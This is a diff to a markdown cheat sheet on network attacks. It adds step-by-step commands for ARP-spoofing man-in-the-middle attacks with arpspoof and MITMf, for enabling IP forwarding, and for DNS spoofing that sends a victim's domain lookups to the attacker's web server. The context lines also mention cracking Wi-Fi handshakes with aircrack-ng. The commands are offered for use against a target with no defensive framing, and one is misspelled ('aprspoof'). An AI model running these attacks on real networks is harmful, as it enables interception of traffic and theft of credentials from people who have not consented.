@@ -14,7 +14,7 @@ View information about wireless interfaces in your device
 ```bash
 iwconfig
 ```
-To change wireless adapter into monitor mode. Monitor mode allow us to sniff packets through the network
+To change wireless adapter into monitor mode. Monitor mode allows us to sniff packets through the network
 
 ```bash
 iwconfig wlan0 mode monitor
@@ -108,6 +108,33 @@ crunch 6 8 abc12 -o test.txt
 ```bash
 aircrack-ng <handshake.cap> -w <text.txt>
 ```
+
+## Man In The Middle Attack (MITM)
+
+1. Scan the network IP with `zenmap` 
+Example: 192.168.1.1/24
+
+2. To map IP addresses in the network and mac addresses `arp -a`
+3. `arpspoof -i <interface> -t <clientIP> <gatewayIP>`
+4. In another window. Tell the router I am the victim: `aprspoof -i <interface> -t <gatewayIP> <clientIP>`
+5. In another window. Allow Linx be the router and forward packets: `echo 1 > /proc/sys/net/ipv4/ip_forward`
+
+## Man in the Middle Framework (MITMf)
+
+Download the tool `apt-get install mitmf`
+
+```bash 
+mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface>
+```
+Use wireshark to sniff packets
+
+## DNS Spoofing with MITMf
+1. Start the web server: `service apache2 start` (var/www/html)
+2. Configure the A records and add the domain you want to change into your IP address: `leafpad /etc/mitmf/mitmf.conf`
+*.___.com = <MyIPAddress>
+3. `mitmf --arp --spoof --gateway <routerIP> --target <targetIP> -i <interface> --dns`
+
+## Capturing Screen of Target
 
 
 
